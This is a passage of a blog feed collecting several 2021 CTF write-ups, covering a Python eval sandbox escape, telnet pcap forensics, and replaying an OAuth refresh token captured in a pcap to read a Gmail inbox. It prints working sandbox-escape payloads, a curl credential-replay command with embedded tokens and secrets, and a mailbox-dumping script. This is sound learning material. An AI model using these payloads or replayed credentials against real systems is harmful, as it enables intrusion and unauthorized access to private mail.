class="line">shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu</span><br></pre></td></tr></table></figure></blockquote></li><li>Got the flag with the right order: <code>buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;</code></li></ul></li></ul><h2 id="Result"><a href="#Result" class="headerlink" title="Result:"></a>Result:</h2><p><img src="https://i.imgur.com/trRnPl2.jpg"></p><ul><li>I solved two challenges:<br>  <img src="https://i.imgur.com/pzaCzpI.jpg"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunshineCTF 2021</title>
      <link href="/2021/09/19/SunshineCTF-2021/"/>
      <url>/2021/09/19/SunshineCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h1><h3 id="ProcrastinatorProgrammer"><a href="#ProcrastinatorProgrammer" class="headerlink" title="ProcrastinatorProgrammer"></a><code>ProcrastinatorProgrammer</code></h3><ul><li><p>The challenge description is long and the challenge seems complex.</p><blockquote><p>This may be a mistake. Or mistakes were made.</p></blockquote></li></ul><p><a href="https://jeff14994.github.io/2021/09/19/SunshineCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><pre><code>&gt;I may have procrastinated security for procrastinate.chal.2021.sunshinectf.org:65000. I may have been watching too many Tom Cruise movies instead of releasing this... uh... last year.&gt;But don&#39;t worry! The keys to the kingdom are split into three parts... you&#39;ll never find them all!&gt;Flag will be given by our backend in the standard sun&#123;&#125; format, but make sure you put all the pieces together!</code></pre><ul><li>Description in image<br><img src="https://i.imgur.com/y51Iy6j.jpg"></li></ul><h3 id="Got-an-url-x3D-gt-Found-out-it’s-a-Python-Sanbox-Challenge"><a href="#Got-an-url-x3D-gt-Found-out-it’s-a-Python-Sanbox-Challenge" class="headerlink" title="Got an url &#x3D;&gt; Found out it’s a Python Sanbox Challenge"></a>Got an url &#x3D;&gt; Found out it’s a Python Sanbox Challenge</h3><ul><li>This challenge is a chain-based problem. The player have to pass the previous level to pass the next level. There are three levels in this challenge.<h4 id="1-First-level"><a href="#1-First-level" class="headerlink" title="1. First level"></a>1. First level</h4></li><li>Connect to the server:<ul><li><code>nc procrastinate-sequel.chal.2021.sunshinectf.org 65000</code></li><li>Result:<blockquote><p>Welcome to the ProcrastinatorProgrammer backend.<br>  Please give me an equation! Any equation! I need to be fed some data to do some processing!I’m super secure, and can use all python! I just use <code>eval()</code> on your data and then whamo, python does all the work!Whatever you do, don’t look at my .&#x2F;key!</p></blockquote><blockquote><p>Give me an equation please!</p></blockquote></li></ul></li><li>First attempt<ul><li>Payload:<br><code>chr(105) + chr(110) + chr(116) + chr(40) + chr(111) + chr(112) + chr(101) + chr(110) + chr(40) + chr(39) + chr(46) + chr(47) + chr(107) + chr(101) + chr(121) + chr(39) + chr(44) + chr(32) + chr(39) + chr(114) + chr(39) + chr(41) + chr(46) + chr(114) + chr(101) + chr(97) + chr(100) + chr(40) + chr(41) + chr(41)</code></li><li>Result<blockquote><p>int(open(‘.&#x2F;key’, ‘r’).read())<br>  If you completed part 1 of the challenge…<br>  Your princess is in another castle! 🔥🏰🔥<br>  procrastinate-castle.chal.2021.sunshinectf.org 65001 holds your next clue.</p></blockquote></li><li>Turn out that there’s some way to escape the Python sandbox.</li></ul></li><li>Second attempt<ul><li>Payload:<br>   <code>__import__(&#39;os&#39;).system(&#39;cat ./key&#39;)</code></li><li>Result (shown as image below):<ul><li>Got first 1&#x2F;3 of the flag: <code>sun&#123;eval_is</code><br>  <img src="https://i.imgur.com/Bx8UQKG.jpg"></li></ul></li></ul></li></ul><h4 id="2-Second-level"><a href="#2-Second-level" class="headerlink" title="2. Second level"></a>2. Second level</h4><ul><li>Connect to the server:<ul><li><code>nc procrastinate-sequel.chal.2021.sunshinectf.org 65000</code></li><li>Result:<blockquote><p>Welcome to the ProcrastinatorProgrammer backend.</p></blockquote><blockquote><p>Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I’ve upped my ante! Now I know it’s secure!I’m super secure, and can use most python math!</p></blockquote><blockquote><p>I just use <code>eval(client_input, \&#123;\&#125;, safe_math_functions)</code> on your data and then whamo, python does all the work!Whatever you do, don’t look at my .&#x2F;key!<br>Halt in the name of the law!<br>What was the .&#x2F;key found in the previous challenge?</p></blockquote></li></ul></li><li>Using the same payload from the first level. <code>__import__(&#39;os&#39;).system(&#39;cat ./key&#39;)</code><ul><li>Result (shown as image below):<ul><li>Got first 2&#x2F;3 of the flag: <code>_safe_</code><br>  <img src="https://i.imgur.com/UOiIoiJ.jpg"><h4 id="3-Third-level"><a href="#3-Third-level" class="headerlink" title="3. Third level"></a>3. Third level</h4></li></ul></li></ul></li><li>First attempt:<ul><li>Payload: <code>[].__class__.__base__.__subclasses__()</code>. Dump all the subclasses modules (shown as image below)<br>  <img src="https://i.imgur.com/ExHYopA.jpg"></li><li>And then, I was stuck. Because there are a lot of subclasses, and I don’t know which to use. But I have a goal which is to read the flag in <code>./key</code>, thus I have to find a way to execute <code>read</code> command in the system.<ul><li>I’ve tried: <code>[].__class__.__base__.__subclasses__().index(&#39;file&#39;)</code> to locate <code>file</code> subclass, but found nothing.</li></ul></li></ul></li><li>Several attempts after first one:<ul><li>First, I tried to look at the functionality of the modules I found above. And then I tried to use the module as the gadget to exectue <code>read</code> command in system.</li><li>Finally, I saw <code>subprocess.Popen</code> at the <code>-4</code> location of the list. Thus I use <code>[].__class__.__base__.__subclasses__()[-4]([&quot;cat&quot;, &quot;./key&quot;])</code> as the payload. And finally obtained the the last 1&#x2F;3 of the flag which is <code>only_if_you_ast_whitelist_first&#125;</code>  (shown as image below)<br>  <img src="https://i.imgur.com/65bgFIL.jpg"><h3 id="Concatenate-the-flag-from-each-level"><a href="#Concatenate-the-flag-from-each-level" class="headerlink" title="Concatenate the flag from each level"></a>Concatenate the flag from each level</h3></li></ul></li><li>Got flag: <code>sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125;</code></li></ul><h2 id="Resouces"><a href="#Resouces" class="headerlink" title="Resouces:"></a>Resouces:</h2><ul><li><a href="/jEt7F7lTSAOHcPnj2b7jlA">欸，你懂 Python 嗎</a></li><li><a href="https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes">Bypass Python sandboxes</a></li><li><a href="https://blog.osiris.cyber.nyu.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/">Python sandbox</a></li><li><a href="https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c">CTF - writeup</a></li><li><a href="https://github.com/w181496/Web-CTF-Cheatsheet">Cheatsheet</a></li></ul><h2 id="CTF-results"><a href="#CTF-results" class="headerlink" title="CTF results"></a>CTF results</h2><h3 id="Place-and-points"><a href="#Place-and-points" class="headerlink" title="Place and points"></a>Place and points</h3><ul><li>We registerd as the ToInfinityAndBeYANd, and got 663 points resulted in 13th in the ctf among 302 teams .<br><img src="https://i.imgur.com/DK8m5bD.jpg"><br><img src="https://i.imgur.com/m96mdL4.jpg"></li></ul><h3 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h3><ul><li>We solved 8 challenges:.<br><img src="https://i.imgur.com/O0rz81M.jpg"></li></ul><h3 id="Score-over-time"><a href="#Score-over-time" class="headerlink" title="Score over time"></a>Score over time</h3><p><img src="https://i.imgur.com/zPrpzaE.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAWCTF 2021</title>
      <link href="/2021/09/13/CSAWCTF-2021/"/>
      <url>/2021/09/13/CSAWCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="Lazy-Leaks"><a href="#Lazy-Leaks" class="headerlink" title="Lazy_Leaks"></a><code>Lazy_Leaks</code></h3><ul><li>Challenge description<br><img src="https://i.imgur.com/bumFkq5.jpg"></li></ul><p><a href="https://jeff14994.github.io/2021/09/13/CSAWCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><h3 id="Got-a-pcpa-file-Lazy-Leaks-pcap"><a href="#Got-a-pcpa-file-Lazy-Leaks-pcap" class="headerlink" title="Got a pcpa file (Lazy_Leaks.pcap)"></a>Got a pcpa file (Lazy_Leaks.pcap)</h3><ul><li>By Wireshark, I opened the pcap file and found it was about 102.783 seconds record of the packets<br><img src="https://i.imgur.com/aoRPZIo.jpg"></li><li>At first, I tried to find some http stream, but found nothing at all. But between packets, <code>telnet</code> protocal caught my attentions. Because I know <code>telnet</code> protocal is unencrypted, so if the admin used this to log in some server, maybe I can obtain some crendentials.</li><li>Thus, I mainly focused on TELNET stream, so I filtered “telnet” in Wireshark and found something interesting.<br><img src="https://i.imgur.com/ov9YBzR.jpg"></li><li>I saw some garbage in the packet, however I found there was a packet that was malformed so I started from that spot. Eventually I found the flag just by browsing the unencrypted messages.</li><li><img src="https://i.imgur.com/flPR46J.jpg"></li></ul><h2 id="CTF-results"><a href="#CTF-results" class="headerlink" title="CTF results"></a>CTF results</h2><h3 id="Place-and-points"><a href="#Place-and-points" class="headerlink" title="Place and points"></a>Place and points</h3><ul><li>We registerd as the ToInfinityAndBeYANd, and got 851 points resulted in 293rd in the ctf.<br><img src="https://i.imgur.com/0EOWXQt.jpg"></li></ul><h3 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h3><ul><li>We solved 11 challenges:.<br><img src="https://i.imgur.com/hbS0js9.jpg"></li></ul><h3 id="Score-over-time"><a href="#Score-over-time" class="headerlink" title="Score over time"></a>Score over time</h3><p><img src="https://i.imgur.com/4IH2IXB.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FWordCTF 2021</title>
      <link href="/2021/08/28/FWordCTF-2021/"/>
      <url>/2021/08/28/FWordCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="listening"><a href="#listening" class="headerlink" title="listening?"></a><code>listening?</code></h3><ul><li>Challenge description<br><img src="https://i.imgur.com/v24T55T.jpg"></li></ul><p><a href="https://jeff14994.github.io/2021/08/28/FWordCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><h3 id="Got-a-pcpa-file-challenge-pcap"><a href="#Got-a-pcpa-file-challenge-pcap" class="headerlink" title="Got a pcpa file (challenge.pcap)"></a>Got a pcpa file (challenge.pcap)</h3><ul><li><p>By Wireshark, I opened the pcap file and found it was about 9 seconds record of the packets<br><img src="https://i.imgur.com/7DMVTYj.jpg"></p></li><li><p>I mainly focused on HTTP Stream, so I filtered “http” in Wireshark and found something interesting.<br><img src="https://i.imgur.com/EcHxJoS.jpg"></p></li><li><p>Because of the form items I observed (shown as the image below), It made a <code>POST</code> request to <code>oauth2.googleapis.com/token</code>. I guessed it made a API call before, so I recreated the payload from the pcap, and tried to make the same API call again.<br><img src="https://i.imgur.com/uhRP0uR.png"></p></li></ul><h3 id="Made-a-google-API-call"><a href="#Made-a-google-API-call" class="headerlink" title="Made a google API call"></a>Made a google API call</h3><ul><li><p>Payload</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://oauth2.googleapis.com/token -d <span class="string">&quot;client_secret=AER8VvrXuFfYfqjhidcekAM0&amp;grant_type=refresh_token&amp;refresh_token=1//044y6gZR87Kl0CgYIARAAGAQSNwF-L9IrkAFpIJPMhiGY0OPJpo5RiA5_7R-mHH-kuHwCMUeFL2JqxevGr23oBJmaxdnrD52t3X4&amp;client_id=1097638694557-3v745luessc34bkoiqkf8tndqgvbqjpm.apps.googleusercontent.com&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>Got an access token json. Besides, I found this access token was for reading gmail’s messages only.</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;access_token&quot;</span>: <span class="string">&quot;ya29.a0ARrdaM9yn8BOV1WE517K_qMViaktMBVtkz3y19-hdqllimqBrXhgXmyhpPDFzAq8N42YBLjuwCLebbj78RWZCL02Pve_gfEabr_e5FFDo1BoXrNWgHj5dVIAn-lglixXue6XFc9nWsO4zRcJTTKxm39SkxxVFw&quot;</span>,</span><br><span class="line">  <span class="string">&quot;expires_in&quot;</span>: <span class="number">3599</span>,</span><br><span class="line">  <span class="string">&quot;scope&quot;</span>: <span class="string">&quot;https://www.googleapis.com/auth/gmail.readonly&quot;</span>,</span><br><span class="line">  <span class="string">&quot;token_type&quot;</span>: <span class="string">&quot;Bearer&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Created token.json to store credentials</p>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;client_secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AER8VvrXuFfYfqjhidcekAM0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;grant_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;refresh_token&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;refresh_token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1//044y6gZR87Kl0CgYIARAAGAQSNwF-L9IrkAFpIJPMhiGY0OPJpo5RiA5_7R-mHH-kuHwCMUeFL2JqxevGr23oBJmaxdnrD52t3X4&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1097638694557-3v745luessc34bkoiqkf8tndqgvbqjpm.apps.googleusercontent.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;access_token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ya29.a0ARrdaM9yn8BOV1WE517K_qMViaktMBVtkz3y19-hdqllimqBrXhgXmyhpPDFzAq8N42YBLjuwCLebbj78RWZCL02Pve_gfEabr_e5FFDo1BoXrNWgHj5dVIAn-lglixXue6XFc9nWsO4zRcJTTKxm39SkxxVFw&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;expires_in&quot;</span><span class="punctuation">:</span> <span class="number">3599</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.googleapis.com/auth/gmail.readonly&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;token_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Bearer&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Interactive-with-Google-gmail-API"><a href="#Interactive-with-Google-gmail-API" class="headerlink" title="Interactive with Google gmail API"></a>Interactive with Google gmail API</h3></li><li><p>I run the Python script on <a href="https://colab.research.google.com/drive/1XtNzIoqCkYQY9pzlZEYtV-PeP7IGOHz7?usp=sharing">colab</a>, the script is shown as following block.</p></li><li><p>It simply provided the credentials to google authentication api’s to get the privilege to read someone’s gmail messages.</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> googleapiclient.discovery <span class="keyword">import</span> build</span><br><span class="line"><span class="keyword">from</span> google_auth_oauthlib.flow <span class="keyword">import</span> InstalledAppFlow</span><br><span class="line"><span class="keyword">from</span> google.auth.transport.requests <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> google.oauth2.credentials <span class="keyword">import</span> Credentials</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># If modifying these scopes, delete the file token.json.</span></span><br><span class="line">SCOPES = [<span class="string">&#x27;https://www.googleapis.com/auth/gmail.readonly&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Shows basic usage of the Gmail API.</span></span><br><span class="line"><span class="string">    Lists the user&#x27;s Gmail labels.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    creds = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># The file token.json stores the user&#x27;s access and refresh tokens, and is</span></span><br><span class="line">    <span class="comment"># created automatically when the authorization flow completes for the first</span></span><br><span class="line">    <span class="comment"># time.</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;token.json&#x27;</span>):</span><br><span class="line">        creds = Credentials.from_authorized_user_file(<span class="string">&#x27;token.json&#x27;</span>, SCOPES)</span><br><span class="line">    <span class="comment"># If there are no (valid) credentials available, let the user log in.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> creds <span class="keyword">or</span> <span class="keyword">not</span> creds.valid:</span><br><span class="line">        <span class="keyword">if</span> creds <span class="keyword">and</span> creds.expired <span class="keyword">and</span> creds.refresh_token:</span><br><span class="line">            creds.refresh(Request())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flow = InstalledAppFlow.from_client_secrets_file(</span><br><span class="line">                <span class="string">&#x27;credentials.json&#x27;</span>, SCOPES)</span><br><span class="line">            creds = flow.run_local_server(port=<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># Save the credentials for the next run</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;token.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> token:</span><br><span class="line">            token.write(creds.to_json())</span><br><span class="line"></span><br><span class="line">    service = build(<span class="string">&#x27;gmail&#x27;</span>, <span class="string">&#x27;v1&#x27;</span>, credentials=creds)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Call the Gmail API</span></span><br><span class="line"></span><br><span class="line">    result = service.users().messages().<span class="built_in">list</span>(userId=<span class="string">&#x27;me&#x27;</span>).execute()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We can also pass maxResults to get any number of emails. Like this:</span></span><br><span class="line">    <span class="comment"># result = service.users().messages().list(maxResults=200, userId=&#x27;me&#x27;).execute()</span></span><br><span class="line">    messages = result.get(<span class="string">&#x27;messages&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># messages is a list of dictionaries where each dictionary contains a message id.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># iterate through all the messages</span></span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> messages:</span><br><span class="line">        <span class="comment"># Get the message from its id</span></span><br><span class="line">        txt = service.users().messages().get(userId=<span class="string">&#x27;me&#x27;</span>, <span class="built_in">id</span>=msg[<span class="string">&#x27;id&#x27;</span>]).execute()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Use try-except to avoid any Errors</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Get value of &#x27;payload&#x27; from dictionary &#x27;txt&#x27;</span></span><br><span class="line">            payload = txt[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">            headers = payload[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Look for Subject and Sender Email in the headers</span></span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> headers:</span><br><span class="line">                <span class="keyword">if</span> d[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;Subject&#x27;</span>:</span><br><span class="line">                    subject = d[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> d[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;From&#x27;</span>:</span><br><span class="line">                    sender = d[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># The Body of the message is in Encrypted format. So, we have to decode it.</span></span><br><span class="line">            <span class="comment"># Get the data and decode it with base 64 decoder.</span></span><br><span class="line">            parts = payload.get(<span class="string">&#x27;parts&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            data = parts[<span class="string">&#x27;body&#x27;</span>][<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">            data = data.replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;+&quot;</span>).replace(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;/&quot;</span>)</span><br><span class="line">            decoded_data = base64.b64decode(data)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Now, the data obtained is in lxml. So, we will parse </span></span><br><span class="line">            <span class="comment"># it with BeautifulSoup library</span></span><br><span class="line">            soup = BeautifulSoup(decoded_data , <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">            body = soup.body()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Printing the subject, sender&#x27;s email and message</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Subject: &quot;</span>, subject)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;From: &quot;</span>, sender)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Message: &quot;</span>, body)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3></li><li><p>Dump all the mail message (There are about 4000 lines of messages, so I filtered some of them, shown as section below)<br>From the message below, we can obtain the flag:<br><code>FwordCTF&#123;email_forensics_is_interesting_73489nn7n4891&#125;</code></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Subject:  fwordplayground@gmail.com</span><br><span class="line">From:  Anonymousemail &lt;noreply@anonymousemail.me&gt;</span><br><span class="line">Message:  [&lt;p&gt;fwordplayground@gmail.com fwordplayground@gmail.com fwordplayground@gmail.com fwordplayground@gmail.com fwordplayground@gmail.com</span><br><span class="line">&lt;/p&gt;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subject:  fwordplayground@gmail.com</span><br><span class="line">From:  Anonymousemail &lt;noreply@anonymousemail.me&gt;</span><br><span class="line">Message:  [&lt;p&gt;Hello everyone</span><br><span class="line">&lt;/p&gt;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subject:  <span class="number">1</span></span><br><span class="line">From:  Anonymousemail &lt;noreply@anonymousemail.me&gt;</span><br><span class="line">Message:  [&lt;p&gt;Hello everyone, Thank you <span class="keyword">for</span> playing Fword CTF</span><br><span class="line">&lt;/p&gt;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subject:  Flag</span><br><span class="line">From:  Fword Team &lt;fword.team@gmail.com&gt;</span><br><span class="line">Message:  [&lt;p&gt;FwordCTF&#123;email_forensics_is_interesting_73489nn7n4891&#125;</span><br><span class="line">&lt;/p&gt;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Subject:  Finish setting up your new Google Account</span><br><span class="line">From:  Google Community Team &lt;googlecommunityteam-noreply@google.com&gt;</span><br><span class="line">Message:  [&lt;p&gt;Let<span class="number">&#x27;</span>s get started,</span><br><span class="line"></span><br><span class="line">Welcome to Google. Your new account comes with access to Google products,  </span><br><span class="line">apps, and services.</span><br><span class="line"></span><br><span class="line">Here are a few tips to get you started.</span><br></pre></td></tr></table></figure></li></ul><h2 id="CTF-results"><a href="#CTF-results" class="headerlink" title="CTF results"></a>CTF results</h2><h3 id="Place-and-points"><a href="#Place-and-points" class="headerlink" title="Place and points"></a>Place and points</h3><ul><li>We registerd as the ToInfinityAndBeYANd, and got 1356 points resulted in 98 th in the ctf.<br><img src="https://i.imgur.com/jKDNMlF.jpg"><h3 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h3></li><li>We solved four challenges: one Welcome, one Cryptography, one bash, and one Forensics challenge.<br><img src="https://i.imgur.com/aXRBAM4.jpg"><br><img src="https://i.imgur.com/apJoHwi.jpg"></li></ul><h3 id="Members-I-am-x0mg"><a href="#Members-I-am-x0mg" class="headerlink" title="Members - I am @x0mg"></a>Members - I am @x0mg</h3><ul><li>I solved the Froensics challenge, although I put a lot of time in osint and reverse engineering but had no good outcome.<br><img src="https://i.imgur.com/oPDP4hL.jpg"><h3 id="Score-over-time"><a href="#Score-over-time" class="headerlink" title="Score over time"></a>Score over time</h3></li><li><img src="https://i.imgur.com/M04Gwdd.jpg"></li></ul><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul><li><a href="https://developers.google.com/gmail/api/quickstart/python">Gmail API Quickstart</a></li><li><a href="https://www.geeksforgeeks.org/how-to-read-emails-from-gmail-using-gmail-api-in-python/">Read email</a></li><li><a href="https://developers.google.com/oauthplayground/">Google Developers - OAuth 2.0 Playground</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
